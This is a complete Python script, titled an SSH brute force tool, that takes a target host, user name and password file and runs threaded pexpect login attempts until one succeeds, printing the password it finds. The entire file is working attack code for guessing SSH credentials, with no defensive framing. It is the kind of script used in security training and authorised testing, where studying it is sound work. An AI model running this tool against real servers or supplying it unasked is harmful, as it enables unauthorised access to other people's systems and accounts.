''' brute force passwords for ssh'''
import argparse
import sys
import time
import threading
import vpconfig  # pylint: disable=E0401
from pexpect import pxssh

connection_lock = threading.BoundedSemaphore(value=vpconfig.MAX_CONNECTIONS)


def connect(host, user, password, release):
    ''' connect to ssh'''
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print('[+] Password config.FOUND: ' + password)
        vpconfig.FOUND = True
    except Exception as e:
        if 'read_nonblocking' in str(e):
            vpconfig.FAILS += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            connection_lock.release()


def main():
    ''' main function'''
    parser = argparse.ArgumentParser(usage='ssh_brute.py -H TARGET_HOST -u TARGET_USER -F PASSWORD_FILE')
    parser.add_argument('-H', metavar='TARGET_HOST', type=str, help='specify target host')
    parser.add_argument('-u', metavar='TARGET_USER', type=str, help='specify the user')
    parser.add_argument('-F', metavar='PASSWORD_FILE', type=str, help='specify password file')
    args = parser.parse_args()

    if args.u is None or args.H is None or args.F is None:
        print("[-] You must specify a target host and user and password file.")
        print(parser.usage)
        sys.exit(0)

    host = str(args.H)
    passwdFile = str(args.F)
    user = str(args.u)

    with open(passwdFile, 'r', encoding='utf-8-sig') as fn:
        for line in fn.readlines():
            if vpconfig.FOUND:
                print('[*] Exiting: Password config.FOUND')
                sys.exit(0)
            if vpconfig.FAILS > 5:
                print('[!] Exiting: Too Many Socket Timeouts')
                sys.exit(0)
            connection_lock.acquire()  # pylint: disable=R1732
            password = line.strip('\r').strip('\n')
            print('[-] Testing: ' + str(password))
            t = threading.Thread(target=connect,
                                 args=(host,
                                       user,
                                       password,
                                       True))
            t.start()


if __name__ == '__main__':
    print('[+] SSH Brute Force Tool starting')
    main()
    print('[+] SSH Brute Force Tool finished')
